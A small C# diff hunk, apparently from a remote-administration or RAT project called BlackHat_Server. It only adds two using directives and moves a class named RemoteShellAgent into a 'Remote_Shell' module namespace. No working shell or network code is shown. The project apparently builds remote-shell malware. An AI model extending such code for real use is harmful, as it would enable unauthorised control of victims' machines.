@@ -2,8 +2,10 @@
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using BlackHat_Server.Class;
+using BlackHat_Server.Class.Comunicator;
 
-namespace BlackHat_Server
+namespace BlackHat_Server.Muduli.Remote_Shell
 {
     internal class RemoteShellAgent
     {
